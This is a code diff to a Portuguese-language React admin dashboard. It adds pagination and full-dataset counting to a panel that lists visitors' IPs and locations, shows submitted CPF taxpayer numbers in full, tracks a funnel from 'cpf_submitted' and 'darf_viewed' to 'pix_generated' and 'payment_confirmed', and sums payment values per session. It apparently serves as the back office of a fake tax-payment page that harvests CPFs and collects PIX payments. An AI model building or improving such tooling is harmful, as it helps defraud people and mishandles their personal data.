@@ -3,7 +3,8 @@ import {
   Users, Eye, BarChart3, Shield, LogOut, MapPin, Globe,
   Clock, AlertTriangle, UserPlus, Trash2, RefreshCw,
   TrendingUp, Ban, Smartphone, Monitor, ChevronRight,
-  DollarSign, FileText, QrCode, Hash, Copy, CheckCircle
+  DollarSign, FileText, QrCode, Hash, Copy, CheckCircle,
+  ChevronLeft
 } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 
@@ -13,15 +14,56 @@ interface AdminDashboardProps {
   onLogout: () => void;
 }
 
+interface PaginationInfo {
+  page: number;
+  per_page: number;
+  visits_total: number;
+  funnel_total: number;
+  blocked_total: number;
+}
+
 interface DashboardData {
   stats: { total_visits: number; total_events: number; total_blocked: number };
   recentVisits: any[];
   funnelData: any[];
+  allFunnelData: any[];
   countryData: any[];
   blockedList: any[];
+  pagination: PaginationInfo;
 }
 
 type Tab = "overview" | "visits" | "funnel" | "blocked" | "users";
+
+const PER_PAGE = 50;
+
+const PaginationControls = ({ page, total, perPage, onPageChange }: { page: number; total: number; perPage: number; onPageChange: (p: number) => void }) => {
+  const totalPages = Math.max(1, Math.ceil(total / perPage));
+  if (totalPages <= 1) return null;
+  return (
+    <div className="flex items-center justify-between px-4 py-3 border-t border-border">
+      <span className="text-xs text-muted-foreground">
+        {((page - 1) * perPage) + 1}–{Math.min(page * perPage, total)} de {total}
+      </span>
+      <div className="flex items-center gap-1">
+        <button
+          onClick={() => onPageChange(page - 1)}
+          disabled={page <= 1}
+          className="p-1.5 rounded-lg hover:bg-muted disabled:opacity-30 transition-colors"
+        >
+          <ChevronLeft className="h-4 w-4" />
+        </button>
+        <span className="text-xs font-bold px-2">{page}/{totalPages}</span>
+        <button
+          onClick={() => onPageChange(page + 1)}
+          disabled={page >= totalPages}
+          className="p-1.5 rounded-lg hover:bg-muted disabled:opacity-30 transition-colors"
+        >
+          <ChevronRight className="h-4 w-4" />
+        </button>
+      </div>
+    </div>
+  );
+};
 
 const AdminDashboard = ({ token, user, onLogout }: AdminDashboardProps) => {
   const [activeTab, setActiveTab] = useState<Tab>("overview");
@@ -32,12 +74,13 @@ const AdminDashboard = ({ token, user, onLogout }: AdminDashboardProps) => {
   const [addingUser, setAddingUser] = useState(false);
   const [newBlockIp, setNewBlockIp] = useState({ ip: "", reason: "" });
   const [blockingIp, setBlockingIp] = useState(false);
+  const [currentPage, setCurrentPage] = useState(1);
 
-  const fetchDashboard = useCallback(async () => {
+  const fetchDashboard = useCallback(async (page = 1) => {
     setLoading(true);
     try {
       const res = await supabase.functions.invoke("admin-auth", {
-        body: { action: "dashboard", token },
+        body: { action: "dashboard", token, page, per_page: PER_PAGE },
       });
       if (res.data?.error === 'Não autorizado') {
         onLogout();
@@ -58,14 +101,19 @@ const AdminDashboard = ({ token, user, onLogout }: AdminDashboardProps) => {
   }, [token]);
 
   useEffect(() => {
-    fetchDashboard();
+    fetchDashboard(currentPage);
     fetchUsers();
     const interval = setInterval(() => {
-      fetchDashboard();
+      fetchDashboard(currentPage);
       fetchUsers();
     }, 15000);
     return () => clearInterval(interval);
-  }, [fetchDashboard, fetchUsers]);
+  }, [fetchDashboard, fetchUsers, currentPage]);
+
+  const handlePageChange = (page: number) => {
+    setCurrentPage(page);
+    fetchDashboard(page);
+  };
 
   const handleAddUser = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -98,10 +146,13 @@ const AdminDashboard = ({ token, user, onLogout }: AdminDashboardProps) => {
         body: { action: "block_ip", token, ip_address: newBlockIp.ip.trim(), reason: newBlockIp.reason.trim() || "Bloqueio manual" },
       });
       setNewBlockIp({ ip: "", reason: "" });
-      fetchDashboard();
+      fetchDashboard(currentPage);
     } catch {}
     setBlockingIp(false);
   };
+
+  // Use allFunnelData for aggregation (complete dataset)
+  const allFunnel = data?.allFunnelData || [];
 
   // Funnel calculation
   const funnelSteps = ["page_view", "cpf_submitted", "result_viewed", "darf_viewed", "pix_generating", "pix_generated", "pix_copied", "payment_confirmed"];
@@ -118,23 +169,23 @@ const AdminDashboard = ({ token, user, onLogout }: AdminDashboardProps) => {
   const funnelCounts = funnelSteps.map((step) => ({
     step,
     label: funnelLabels[step],
-    count: data?.funnelData?.filter((e: any) => e.event_type === step).length || 0,
+    count: allFunnel.filter((e: any) => e.event_type === step).length,
   }));
   const maxFunnel = Math.max(...funnelCounts.map((f) => f.count), 1);
 
   // Unique CPFs
-  const uniqueCpfs = new Set(data?.funnelData?.filter((e: any) => e.cpf).map((e: any) => e.cpf) || []);
+  const uniqueCpfs = new Set(allFunnel.filter((e: any) => e.cpf).map((e: any) => e.cpf));
 
   // Specific counters
-  const cpfSubmittedCount = data?.funnelData?.filter((e: any) => e.event_type === "cpf_submitted").length || 0;
-  const darfViewedCount = data?.funnelData?.filter((e: any) => e.event_type === "darf_viewed").length || 0;
-  const pixGeneratedCount = data?.funnelData?.filter((e: any) => e.event_type === "pix_generated").length || 0;
-  const pixCopiedCount = data?.funnelData?.filter((e: any) => e.event_type === "pix_copied").length || 0;
-  const paymentConfirmedCount = data?.funnelData?.filter((e: any) => e.event_type === "payment_confirmed").length || 0;
+  const cpfSubmittedCount = allFunnel.filter((e: any) => e.event_type === "cpf_submitted").length;
+  const darfViewedCount = allFunnel.filter((e: any) => e.event_type === "darf_viewed").length;
+  const pixGeneratedCount = allFunnel.filter((e: any) => e.event_type === "pix_generated").length;
+  const pixCopiedCount = allFunnel.filter((e: any) => e.event_type === "pix_copied").length;
+  const paymentConfirmedCount = allFunnel.filter((e: any) => e.event_type === "payment_confirmed").length;
 
-  // Total value: get the max valor per session from any event that has it
+  // Total value
   const sessionValues: Record<string, number> = {};
-  (data?.funnelData || []).forEach((e: any) => {
+  allFunnel.forEach((e: any) => {
     const meta = typeof e.metadata === 'string' ? JSON.parse(e.metadata) : e.metadata;
     const valor = Number(meta?.valor) || 0;
     if (valor > 0) {
@@ -160,7 +211,7 @@ const AdminDashboard = ({ token, user, onLogout }: AdminDashboardProps) => {
   });
   const topCities = Object.entries(cityCounts).sort((a, b) => b[1] - a[1]).slice(0, 10);
 
-  // Mobile vs Desktop
+  // Mobile vs Desktop from all visits
   const mobileCount = data?.recentVisits?.filter((v: any) => v.is_mobile).length || 0;
   const desktopCount = (data?.recentVisits?.length || 0) - mobileCount;
 
@@ -171,6 +222,8 @@ const AdminDashboard = ({ token, user, onLogout }: AdminDashboardProps) => {
     { id: "blocked", label: "Bloqueados", icon: Ban },
     { id: "users", label: "Usuários", icon: Users },
   ];
+
+  const pagination = data?.pagination;
 
   return (
     <div className="min-h-screen bg-background">
@@ -187,7 +240,7 @@ const AdminDashboard = ({ token, user, onLogout }: AdminDashboardProps) => {
             </div>
           </div>
           <div className="flex items-center gap-2">
-            <button onClick={() => { fetchDashboard(); fetchUsers(); }} className="p-2 rounded-lg hover:bg-muted transition-colors">
+            <button onClick={() => { fetchDashboard(currentPage); fetchUsers(); }} className="p-2 rounded-lg hover:bg-muted transition-colors">
               <RefreshCw className={`h-4 w-4 text-muted-foreground ${loading ? "animate-spin" : ""}`} />
             </button>
             <button onClick={onLogout} className="flex items-center gap-1.5 px-3 py-2 rounded-lg hover:bg-muted transition-colors text-xs text-muted-foreground">
@@ -203,7 +256,7 @@ const AdminDashboard = ({ token, user, onLogout }: AdminDashboardProps) => {
           {tabs.map((tab) => (
             <button
               key={tab.id}
-              onClick={() => setActiveTab(tab.id)}
+              onClick={() => { setActiveTab(tab.id); setCurrentPage(1); }}
               className={`flex items-center gap-1.5 px-3 py-2.5 text-xs font-medium border-b-2 transition-colors whitespace-nowrap ${
                 activeTab === tab.id
                   ? "border-primary text-primary"
@@ -316,8 +369,9 @@ const AdminDashboard = ({ token, user, onLogout }: AdminDashboardProps) => {
             {/* VISITS */}
             {activeTab === "visits" && data && (
               <div className="rounded-xl border border-border bg-card shadow-sm overflow-hidden">
-                <div className="p-4 border-b border-border">
-                  <h3 className="text-sm font-bold text-foreground">Últimos Acessos</h3>
+                <div className="p-4 border-b border-border flex items-center justify-between">
+                  <h3 className="text-sm font-bold text-foreground">Acessos</h3>
+                  <span className="text-xs text-muted-foreground">{pagination?.visits_total || 0} total</span>
                 </div>
                 <div className="overflow-x-auto">
                   <table className="w-full text-xs">
@@ -361,6 +415,12 @@ const AdminDashboard = ({ token, user, onLogout }: AdminDashboardProps) => {
                     </tbody>
                   </table>
                 </div>
+                <PaginationControls
+                  page={currentPage}
+                  total={pagination?.visits_total || 0}
+                  perPage={PER_PAGE}
+                  onPageChange={handlePageChange}
+                />
               </div>
             )}
 
@@ -403,10 +463,11 @@ const AdminDashboard = ({ token, user, onLogout }: AdminDashboardProps) => {
                   </div>
                 </div>
 
-                {/* Recent CPF events */}
+                {/* Recent CPF events - paginated */}
                 <div className="rounded-xl border border-border bg-card shadow-sm overflow-hidden">
-                  <div className="p-4 border-b border-border">
+                  <div className="p-4 border-b border-border flex items-center justify-between">
                     <h3 className="text-sm font-bold text-foreground">Eventos Recentes com CPF</h3>
+                    <span className="text-xs text-muted-foreground">{pagination?.funnel_total || 0} total</span>
                   </div>
                   <div className="overflow-x-auto">
                     <table className="w-full text-xs">
@@ -418,13 +479,15 @@ const AdminDashboard = ({ token, user, onLogout }: AdminDashboardProps) => {
                         </tr>
                       </thead>
                       <tbody>
-                        {data.funnelData.filter((e: any) => e.cpf).slice(0, 30).map((e: any, i: number) => (
+                        {data.funnelData.filter((e: any) => e.cpf).map((e: any, i: number) => (
                           <tr key={i} className="border-b border-border/50 hover:bg-muted/30">
                             <td className="p-2.5 tabular-nums whitespace-nowrap">{new Date(e.created_at).toLocaleString("pt-BR")}</td>
                             <td className="p-2.5 font-mono font-bold">{e.cpf}</td>
                             <td className="p-2.5">
                               <span className={`inline-flex rounded-md px-2 py-0.5 text-[10px] font-bold ${
                                 e.event_type === "pix_generated" ? "bg-accent/10 text-accent" :
+                                e.event_type === "pix_copied" ? "bg-primary/10 text-primary" :
+                                e.event_type === "payment_confirmed" ? "bg-accent/10 text-accent" :
                                 e.event_type === "cpf_submitted" ? "bg-primary/10 text-primary" :
                                 "bg-muted text-muted-foreground"
                               }`}>
@@ -436,6 +499,12 @@ const AdminDashboard = ({ token, user, onLogout }: AdminDashboardProps) => {
                       </tbody>
                     </table>
                   </div>
+                  <PaginationControls
+                    page={currentPage}
+                    total={pagination?.funnel_total || 0}
+                    perPage={PER_PAGE}
+                    onPageChange={handlePageChange}
+                  />
                 </div>
               </div>
             )}
@@ -477,8 +546,9 @@ const AdminDashboard = ({ token, user, onLogout }: AdminDashboardProps) => {
                 </div>
 
                 <div className="rounded-xl border border-border bg-card shadow-sm overflow-hidden">
-                <div className="p-4 border-b border-border">
-                  <h3 className="text-sm font-bold text-foreground">IPs Bloqueados ({data.blockedList.length})</h3>
+                <div className="p-4 border-b border-border flex items-center justify-between">
+                  <h3 className="text-sm font-bold text-foreground">IPs Bloqueados</h3>
+                  <span className="text-xs text-muted-foreground">{pagination?.blocked_total || 0} total</span>
                 </div>
                 <div className="overflow-x-auto">
                   <table className="w-full text-xs">
@@ -503,6 +573,12 @@ const AdminDashboard = ({ token, user, onLogout }: AdminDashboardProps) => {
                     </tbody>
                   </table>
                 </div>
+                <PaginationControls
+                  page={currentPage}
+                  total={pagination?.blocked_total || 0}
+                  perPage={PER_PAGE}
+                  onPageChange={handlePageChange}
+                />
               </div>
               </div>
             )}
